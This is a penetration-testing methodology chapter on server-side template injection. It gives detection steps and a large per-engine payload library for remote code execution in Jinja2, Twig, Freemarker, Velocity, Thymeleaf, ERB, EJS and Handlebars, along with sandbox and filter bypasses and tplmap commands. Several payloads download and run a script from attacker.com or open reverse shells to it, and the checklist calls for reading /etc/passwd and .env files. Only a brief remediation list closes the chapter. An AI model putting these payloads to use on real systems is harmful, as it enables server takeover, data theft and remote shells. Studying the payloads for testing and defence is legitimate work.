---
title: "Server-Side Template Injection (SSTI)"
date: 2026-02-24
draft: false
---

# Server-Side Template Injection (SSTI)

> **Severity**: Critical
> **CWE**: CWE-94
> **OWASP**: A03:2021 – Injection

---

## What Is SSTI?

Server-Side Template Injection occurs when user input is embedded **unsanitized into a template that is then rendered server-side**. Unlike XSS (where input is reflected in HTML), SSTI input is processed by the template engine itself — meaning arbitrary expressions, object traversal, and in most cases, **OS command execution**.

The severity is almost always critical: most template engines provide access to the underlying language runtime, and sandbox escapes are well-documented for every major engine.

### Key Insight

```
XSS:   input → reflected in HTML → executes in victim's browser
SSTI:  input → processed by template engine → executes on the server
```

The moment you see `49` returned when you submit `{{7*7}}`, you have server-side code execution surface.

---

## Attack Surface Map

### Where SSTI Typically Appears

```
# Direct reflection scenarios:
- "Hello {{username}}" — if username is user-controlled
- Error pages that include the requested path
- Email templates built from user input (name, subject, body)
- PDF / report generators with user-supplied template fragments
- Marketing / notification templates with personalization
- CMS page builders, blog platforms with Twig/Jinja rendering
- Custom expression evaluators ("smart fields" in SaaS tools)
- Search pages: "No results for {{query}}"
- URL/path-based reflection: /greet/{{name}}

# Indirect reflection:
- User profile fields stored and later rendered in admin templates
- Custom webhook message templates
- Log viewers rendering user-supplied content
- Chat/notification systems with template personalization
```

---

## Engine Detection — Decision Tree

Submit these payloads and observe output. The tree narrows down the engine:

```
Step 1 — Submit: ${ {<%['"}}%\
         → If error message: read it (Jinja2/Twig/Freemarker errors are distinct)

Step 2 — Submit: {{7*7}}
         → Returns 49  → Jinja2, Twig, or similar
         → Returns {{7*7}} (no eval) → Not a Mustache/Handlebars-style engine
         → Error → Template engine present but different syntax

Step 3 — Submit: {{7*'7'}}
         → Returns 49     → Twig (PHP)
         → Returns 7777777 → Jinja2 (Python) — string * int = repetition
         → Error         → Try other syntaxes

Step 4 — Try: <%= 7*7 %>
         → Returns 49     → ERB (Ruby), EJS (Node.js), or JSP/Mako

Step 5 — Try: ${7*7}
         → Returns 49     → Freemarker (Java), Velocity (Java), Thymeleaf
         → Try: #{7*7}    → Returns 49 → Pebble or Thymeleaf (Spring)

Step 6 — Try: {7*7}
         → Returns 49     → Smarty (PHP)

Step 7 — Try: *{7*7}
         → Returns 49     → Thymeleaf (Spring) — SpEL expression
```

### Quick Syntax Cheatsheet

| Engine | Language | Syntax | Test Payload |
|--------|----------|--------|-------------|
| Jinja2 | Python | `{{ }}` | `{{7*7}}` |
| Mako | Python | `${ }` | `${7*7}` |
| Tornado | Python | `{{ }}` | `{{7*7}}` |
| Twig | PHP | `{{ }}` | `{{7*'7'}}` → 49 |
| Smarty | PHP | `{ }` | `{7*7}` |
| Blade | PHP | `{{ }}` | `{{7*7}}` |
| Freemarker | Java | `${ }` | `${7*7}` |
| Velocity | Java | `#set` | `#set($x=7*7)$x` |
| Thymeleaf | Java | `*{ }` / `[[ ]]` | `*{7*7}` |
| Pebble | Java | `{{ }}` | `{{7*7}}` |
| ERB | Ruby | `<%= %>` | `<%= 7*7 %>` |
| Slim | Ruby | `#{ }` | `#{7*7}` |
| EJS | Node.js | `<%= %>` | `<%= 7*7 %>` |
| Handlebars | Node.js | `{{ }}` | Sandboxed — bypass needed |
| Nunjucks | Node.js | `{{ }}` | `{{7*7}}` |
| Pug/Jade | Node.js | `#{ }` | `#{7*7}` |
| Razor | .NET | `@( )` | `@(7*7)` |
| Liquid | Ruby/JS | `{{ }}` | Limited — no RCE |

---

## Discovery Checklist

### Phase 1 — Identify Reflection Points

- [ ] Inject `{{7*7}}` in all input fields — look for `49` in response
- [ ] Inject `${7*7}` — look for `49`
- [ ] Inject `<%= 7*7 %>` — look for `49`
- [ ] Inject `#{7*7}` — look for `49`
- [ ] Inject `*{7*7}` — look for `49` (Thymeleaf)
- [ ] Inject `{7*7}` — look for `49` (Smarty)
- [ ] Check URL path parameters, query strings, POST body, JSON fields, headers
- [ ] Check fields that appear in confirmation pages, emails, error messages
- [ ] Check "custom message" or "template" features in app settings
- [ ] Inject in User-Agent, Referer if they appear in logs/UI rendered server-side

### Phase 2 — Determine Engine & Context

- [ ] Use the decision tree above to narrow down engine
- [ ] Check error messages for framework/library names
- [ ] Check HTTP response headers (`X-Powered-By`, `Server`, language-specific headers)
- [ ] Check `/robots.txt`, `sitemap.xml`, error pages for framework hints
- [ ] Determine if you're inside a string context (needs escape first)
- [ ] Determine if there are filters/blocks on specific characters or keywords

### Phase 3 — Escalate to RCE

- [ ] Use engine-specific RCE payload (see payloads below)
- [ ] If blocked: try sandbox escape (see bypass section)
- [ ] Confirm code execution: `id`, `whoami`, `ls /`
- [ ] Read sensitive files: `/etc/passwd`, `.env`, config files
- [ ] Establish reverse shell or download implant

---

## Payload Library

### Jinja2 (Python)

#### Information Gathering

```python
{{7*7}}
{{config}}
{{config.items()}}
{{settings}}
{{request}}
{{request.environ}}
{{self.__dict__}}
{{self._TemplateReference__context}}
```

#### RCE via `__mro__` / `__subclasses__` chain

```python
-- The classic MRO chain (finds subprocess/popen):
{{''.__class__.__mro__[1].__subclasses__()}}
-- → dump all subclasses, find index of <class 'subprocess.Popen'>
-- common indexes: 213, 217, 258, 356 (varies by Python/version)

-- Once index is found (example 258):
{{''.__class__.__mro__[1].__subclasses__()[258](['id'],stdout=-1).communicate()}}
{{''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()}}

-- More reliable — search dynamically:
{{''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','Popen')|list}}

-- Via __init__.__globals__:
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}   -- file read (class 40 = file in Py2)

-- Subprocess via globals:
{{request.__class__._load_form_data.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

-- Cleaner RCE approach:
{{self.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,capture_output=True).stdout.decode()}}
```

#### RCE via `__builtins__`

```python
{{__import__('os').popen('id').read()}}
{{__import__('os').system('id')}}
{{__import__('subprocess').check_output(['id'])}}

-- Via cycler:
{{cycler.__init__.__globals__.os.popen('id').read()}}

-- Via joiner:
{{joiner.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

-- Via namespace:
{{namespace.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

#### Jinja2 Filter Bypass (when `__`, `[`, `'` are blocked)

```python
-- Bypassing underscore filtering using request.args:
-- Inject in URL: ?x=__class__
{{request.args.x}}          -- returns __class__ string
{{(request|attr(request.args.x))}}   -- accesses attribute dynamically

-- Using attr() filter to avoid dot notation:
{{(''|attr('\x5f\x5fclass\x5f\x5f'))}}    -- __class__ in hex escape
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

-- Using string concatenation:
{{'_'*2+'class'+'_'*2}}    -- builds '__class__' string
{{''[('__cla'+'ss__')]}}   -- string indexing

-- Via Jinja2's |string filter and select:
{{''.__class__.__mro__[1].__subclasses__()|map(attribute='__name__')|list}}

-- Bypass [] using __getitem__:
{{''.__class__.__mro__.__getitem__(1).__subclasses__()}}

-- Using format strings to hide keywords:
{{'%s%s'|format('__clas','s__')}}
```

---

### Twig (PHP)

#### Information Gathering

```
{{7*7}}
{{_self}}
{{_self.env}}
{{dump(app)}}
{{app.user}}
{{app.request}}
```

#### RCE

```
-- Via _self.env (Twig < 1.27.0):
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

-- Via system():
{{['id']|filter('system')}}
{{['id',""]|sort('system')}}
{{['cat /etc/passwd']|filter('system')}}

-- Via passthru():
{{['id']|filter('passthru')}}

-- Via exec():
{{['id',0,result]|filter('exec')}}{{result}}

-- Via shell_exec():
{{{'id':None}|filter('array_keys')|filter('shell_exec')}}

-- Class instance trick:
{{_self.env.setCache("ftp://attacker.com/exploit")}}{{_self.env.loadTemplate("exploit")}}

-- With Twig 3.x:
{{['/usr/bin/id']|map('shell_exec')}}
{{['/usr/bin/id']|reduce('passthru')}}
```

#### Twig Filter Bypass

```
-- Bypass using unicode:
{{'id'|e('html')}}   -- not bypass but shows filter use
-- Use alternate execution functions if system() is blocked:
passthru, exec, shell_exec, popen, proc_open, pcntl_exec

-- bypass via array handling:
{{['id']|filter('system')}}
{{{'a':'id'}|map('system')}}
```

---

### Freemarker (Java)

#### Information Gathering

```
${7*7}
${.data_model}
${.vars}
${freemarker.version}
```

#### RCE

```java
-- Via freemarker.template.utility.Execute:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://attacker.com/shell.sh|bash")}

-- Via Runtime:
${"freemarker.template.utility.Execute"?new()("id")}

-- Via ObjectConstructor:
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign owc=classLoader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign dwf=owc.newInstance()>
${dwf("freemarker.template.utility.Execute","id")}

-- Via JythonRuntime:
<#assign jython="freemarker.ext.jython.JythonRuntime"?new()>
<@jython>import os; os.system("id")</@jython>
```

---

### Velocity (Java)

#### RCE

```java
-- Via Runtime:
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

-- Cleaner:
#set($str=$e.getClass().forName("java.lang.String"))
#set($chr=$e.getClass().forName("java.lang.Character"))
#set($ex=$e.getClass().forName("java.lang.Runtime").getMethod("exec",$str.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))

-- Via ClassLoaderVelocityEngine:
#foreach($i in [1])
#set($exec="".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))
#set($stream=$exec.getInputStream())
#set($output="")
#foreach($b in [1])
#set($output=$output.concat($stream.read()))
#end
$output
#end
```

---

### Thymeleaf (Java / Spring)

#### Information Gathering

```
*{T(java.lang.System).getenv()}
[[${T(java.lang.System).getenv()}]]
*{7*7}
```

#### RCE

```java
-- SpEL expression injection:
*{T(java.lang.Runtime).getRuntime().exec('id')}

-- With output capture:
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}

-- Via ProcessBuilder:
*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","id"}).getInputStream()).useDelimiter("\\A").next()}

-- Thymeleaf in URL path (Fragment Expression):
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::blah

-- Template fragment SSTI:
/path/__${T(java.lang.Runtime).getRuntime().exec("id")}__/

-- Inline [[]] syntax:
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

---

### Smarty (PHP)

#### RCE

```php
-- Via {php} tag (Smarty < 3.1.30):
{php}echo `id`;{/php}
{php}system('id');{/php}

-- Via {literal} escape:
{literal}{/literal}

-- Via Smarty tag:
{$smarty.version}
{$smarty.now}

-- Via function call (if not sandboxed):
{system('id')}
{passthru('id')}
{'id'|shell_exec}

-- Via eval:
{math equation='7*7'}      -- 49
{eval var='<?php system(\"id\");?>'}

-- Smarty 3.x via __PHP_Incomplete_Class:
{function name="x"}{/function}{$smarty.template_object->smarty->_tpl_vars['SCRIPT_NAME']}
```

---

### ERB (Ruby on Rails)

#### Information Gathering

```ruby
<%= 7*7 %>
<%= ENV %>
<%= File.read('/etc/passwd') %>
<%= Rails.application.config %>
```

#### RCE

```ruby
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id')[0] %>
<%= Kernel.exec('id') %>

-- Reverse shell:
<%= require 'socket'; s=TCPSocket.new('attacker.com',4444); while(cmd=s.gets); IO.popen(cmd,'r'){|io|s.print io.read}; end %>
```

---

### EJS (Node.js)

#### RCE

```javascript
<%= 7*7 %>
<%= process.env %>
<%= require('child_process').execSync('id').toString() %>
<%= require('child_process').exec('id', function(e,s,er){return s}) %>
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

-- Reverse shell:
<%= require('child_process').execSync('bash -i >& /dev/tcp/attacker.com/4444 0>&1').toString() %>
```

---

### Pug/Jade (Node.js)

#### RCE

```javascript
#{7*7}
- var x = require('child_process').execSync('id').toString()
= x

-- Inline:
#{require('child_process').execSync('id').toString()}

-- With process:
- global.process.mainModule.require('child_process').exec('id',function(e,s){console.log(s)})
```

---

### Handlebars (Node.js — Sandboxed)

Handlebars has a built-in sandbox — direct property access is blocked. Bypass via prototype pollution or lookup helper:

```javascript
-- Lookup helper bypass:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

-- Simpler prototype pollution approach (if app is vulnerable to proto pollution):
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}
```

---

## Bypass Techniques

### Sandbox Escape — Jinja2

```python
-- When __class__, __mro__ are filtered by WAF/sandbox:

-- Hex encoding attributes:
{{request|attr('\x5f\x5fclass\x5f\x5f')}}

-- Using |attr() with concatenated strings:
{{'__cl'+'ass__'}}
{{request|attr('__cl'+'ass__')}}

-- Using format strings:
{{('%c'|format(95)*2)+'class'+('%c'|format(95)*2)}}

-- Accessing via request.args / request.form to smuggle blocked strings:
# URL: ?a=__class__&b=__mro__&c=__subclasses__
{{(request|attr(request.args.a))}}
{{(request|attr(request.args.a)|attr(request.args.b))}}

-- Using lipsum / g:
{{lipsum.__globals__['os'].popen('id').read()}}
{{g.pop.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

-- Using config (Flask):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

-- Using url_for:
{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

-- Python 3 — find Popen without hardcoded index:
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if 'Popen' in x.__name__ %}
    {{x(['id'],stdout=-1).communicate()[0].decode()}}
  {% endif %}
{% endfor %}
```

### Dot Notation vs Subscript

```python
-- When dots are filtered:
obj.attr  →  obj['attr']  →  obj|attr('attr')
''.__class__  →  ''['__class__']  →  ''|attr('__class__')
```

### Encoding Tricks (for WAF bypass)

```python
-- Hex escape in Python:
'\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f'  = '__class__'

-- Unicode:
'\u005f\u005fclass\u005f\u005f'

-- String concat:
'__cl'+'ass__'
'_'*2+'class'+'_'*2

-- Request args smuggling (most reliable):
-- Any blocked keyword → pass via GET/POST param, access via request.args
```

---

## Quick Identification Payloads

```
{{7*7}}                  → 49   = Jinja2, Twig, Pebble, Nunjucks
{{7*'7'}}                → 49   = Twig (PHP)
{{7*'7'}}                → 7777777 = Jinja2 (Python)
${7*7}                   → 49   = Freemarker, Velocity, Spring EL
<%= 7*7 %>               → 49   = ERB, EJS, Mako
#{7*7}                   → 49   = Ruby Slim, Pug
*{7*7}                   → 49   = Thymeleaf
{7*7}                    → 49   = Smarty

# Polyglot probe (triggers errors in most engines):
${ {<%['"}}%\

# Safe probe (no side effects):
{{7*7}}${7*7}<%= 7*7 %>{7*7}
```

---

## Tools

```bash
# tplmap — automated SSTI scanner and exploiter:
git clone https://github.com/epinna/tplmap
python tplmap.py -u "https://target.com/page?name=*"
python tplmap.py -u "https://target.com/page?name=*" --os-shell
python tplmap.py -u "https://target.com/page?name=*" --os-cmd id
python tplmap.py -u "https://target.com/page?name=*" --upload /local/file /remote/path
python tplmap.py -u "https://target.com/page?name=*" --engine Jinja2

# tplmap with POST:
python tplmap.py -u "https://target.com/login" -d "username=*&password=test"

# Burp extension: J2EE Scan (catches Freemarker/Velocity in Java apps)

# Manual detection with ffuf:
ffuf -w ssti-payloads.txt -u "https://target.com/page?name=FUZZ" -mr "49"

# SSTImap (improved, actively maintained):
git clone https://github.com/vladko312/SSTImap
python sstimap.py -u "https://target.com/?name=*"
```

---

## Remediation Reference

- **Never concatenate user input into template strings** — treat template content as code, not data
- **Pass user data as template variables**, not as template source: `render("Hello {{name}}", {"name": user_input})` ✓
- **Use sandboxed environments** where available (Jinja2's `SandboxedEnvironment`) — but note they are bypassable
- **Validate and reject** inputs that contain template syntax (`{{`, `}}`, `${`, `<%`, etc.)
- **Principle of least privilege** — run the application with minimal OS permissions to limit RCE impact

---

*Part of the Web Application Penetration Testing Methodology series.*
*Previous: [Chapter 05 — OS Command Injection](05_CMDi.md) | Next: [Chapter 07 — CSTI](07_CSTI.md)*
